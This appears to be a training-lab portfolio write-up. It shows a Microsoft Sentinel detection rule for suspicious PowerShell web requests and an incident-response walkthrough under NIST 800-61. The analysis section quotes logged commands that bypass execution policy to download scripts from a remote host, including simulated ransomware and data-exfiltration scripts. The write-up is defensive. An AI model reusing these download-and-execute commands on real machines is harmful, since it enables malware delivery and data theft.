<img width="450" height="450" alt="image" src="https://github.com/user-attachments/assets/ba648d21-0888-43ea-9aea-8c2ba54cdadd" />

# Incident Response PowerShell Suspicious Web Request

## Project Overview
This project demonstrates the implementation of a security detection rule in Microsoft Sentinel to identify and respond to suspicious PowerShell activity. Specifically, it focuses on detecting when PowerShell's `Invoke-WebRequest` command is used to download potentially malicious payloads from the internet a common post-exploitation technique used by threat actors.

## Technologies Used
- Microsoft Sentinel - Cloud-native SIEM for security analytics and threat intelligence
- Microsoft Defender for Endpoint (MDE) - Endpoint detection and response platform
- Log Analytics Workspace - Centralized log collection and querying
- Kusto Query Language (KQL) - Query language for log analysis
- PowerShell - Command-line shell used for attack simulation
- NIST 800-61 - Incident Response Lifecycle framework

## Scenario
A user reports unusual behavior after clicking a link in an email. Unknown to them, the link executed a script that:
1. Launched a hidden PowerShell command on the system.

2. Used Invoke-WebRequest / Invoke-RestMethod to reach out to an external server.

3. Downloaded a secondary script, containing the attacker’s actual payload.

4. Immediately executed the downloaded script.

5. Attempted to:
- Enroll the host into a botnet
- Establish stealthy remote control
- Exfiltrate sensitive data
All malicious activity originated from a single user action, followed by an automated chain of PowerShell-based events.

By using built-in utilities and commands like `Invoke-WebRequest`, attackers can blend in with normal system activity and bypass traditional defenses. Detecting this behavior is critical to identifying and disrupting ongoing attacks.
<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/b1d97c2d-dc0f-49fd-ba9d-c13e33628bd8" />

----
## Part 1: Create Alert Rule (PowerShell Suspicious Web Request)
Design a Sentinel Scheduled Query Rule that detects when PowerShell uses `Invoke-WebRequest` to download content from the internet.
## KQL Query
```
let TargetHostname = "windows-target-1";
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where ProcessCommandLine has "Invoke-WebRequest"
| order by TimeGenerated
```
<img width="1740" height="113" alt="image" src="https://github.com/user-attachments/assets/e521e308-81f7-4ff2-a4b6-caef28b90781" />



## Analytics Rule Configuration
Navigate in Microsoft Sentinel:  
**Sentinel → Analytics → Create → Scheduled Query Rule**

| **Setting**           | **Value**                                                                 |
|-----------------------|---------------------------------------------------------------------------|
| **Name**              | PowerShell Suspicious Web Request                                         |
| **Description**       | Detects PowerShell processes using `Invoke-WebRequest` to download content from the internet, which may indicate malicious payload downloads |
| **Status**            | Enabled                                                                   |
| **MITRE ATT&CK**      |  T1071.001 (Application Layer Protocol: Web Protocol) <br> T1059.001 (Command Scripting Interpreter: PowerShell) <br> T1105 (Command and Control: Ingress Tool Transfer) <br> T1203 (Execution: Explotaton for Client Execution)  <br> T1041 (Exfiltration Over C2 Channel)|
| **Query Frequency**   | Every 4 hours                                                             |
| **Lookup Period**     | Last 24 hours                                                             |
| **Alert Threshold**   | Greater than 0 results                                                    |
| **Query Suppression** | Stop running after alert generated (24 hours)                             |

<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/e0a592ef-20a3-4a1c-bef9-8b27a68a23d7" />


## Entity Mappings

| **Entity Type** | **Identifier**  | **Value**              |
|------------------|------------------|--------------------------|
| Account          | Name             | AccountName              |
| Host             | HostName         | DeviceName               |
| Process          | CommandLine      | ProcessCommandLine       |


## Part 2: Work Incident
Following the NIST 800-61 Incident Response Lifecycle, we'll investigate and respond to this incident.

Diagram of NIST 800-61 phases: Preparation, Detection & Analysis, Containment/Eradication/Recovery, Post-Incident Activities
<img width="300" height="326" alt="image" src="https://github.com/user-attachments/assets/0cc47bb6-88b3-47b4-a5fd-6635e7257040" />

**1. Preparation**
- Documented roles, responsibilities, and procedures
- Analytics rules are in place to detect threats
<img width="300" height="500" alt="image" src="https://github.com/user-attachments/assets/f112f60e-07c1-4edb-bf13-97cf6126d46c" />
<img width="400" height="500" alt="image" src="https://github.com/user-attachments/assets/2913b327-9921-4cb8-bec8-98593436a00b" />
<img width="400" height="500" alt="image" src="https://github.com/user-attachments/assets/a679266b-6081-46c0-a4ee-9305bc476098" />



**2. Detection and Analysis** 
upon Investigating the triggered incident "PowerShell Suspicious Web Request" 
It was discovered that the following Powershell commands were run on machine: windows-target-1
The suspicious web request incident was triggetd on 1 device by user, but downloaded 4 different scripts with 4 differents commands 

Powershell Commands:
 windows-target-1
 powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1
 powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1
 powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1
"cmd.exe" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1

-----
The following Scripts contained: 
portscan.ps1
pwncrypt.ps1
eicar.ps1
exfiltratedata.ps1

-----

I contacted the user to know what they were doing on their PC around the time the logs were generated, they said they wanted to install a free software, as a result a black screen appearead and nothing happened afterwards 

-----
After Investigating with defender for endpoint, it was determined that the downloaded scripts actually did run 

```
let TargetHostname = "windows-target-1"; 
let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]); // Add the name of the scripts that were downloaded
DeviceProcessEvents
| where DeviceName == TargetHostname // Comment this line out for MORE results
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| order by TimeGenerated
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
```


We passed the scripts off the malware reverse engineering team, and these were the one-liners they came up with for each script:
- Poetscan.ps1: Scans a specified range of IP address for open ports from a list of common ports and logs the results.
- Eicar.ps1: Creates an Eicar test file, a standard for testing antivirus solutions, and logs the process.
- Exfiltratedata.ps1: generates fake employee data, compresses it into a ZIP file, and uploads it to an Azure blob storage container, simulating data.
- Pwncrypt.ps1: Encrypts files in a selected user’s desktop folder, simulating ransomware activity, and creates a ransom note with decryption instructions.

**3. Containment, Eradication, and Recovery**
- Isolate affected systems to prevent further damage.
- Machine was isolated in MDE and anti-malware scan was run
- After the machine came back clean, we removed it from isolation
<img width="821" height="509" alt="image" src="https://github.com/user-attachments/assets/cd105263-7306-49b7-832d-0b532f58a93a" />

**4. Post-Incident Activities**

Had the affected user go trough extra rounds of cybersecurity awareness training and upgraded our Cyber awarness training package from KnowBe4 and increased frequency 

- Starte the implementation of a policy that restricts the use of powershell for non essential users

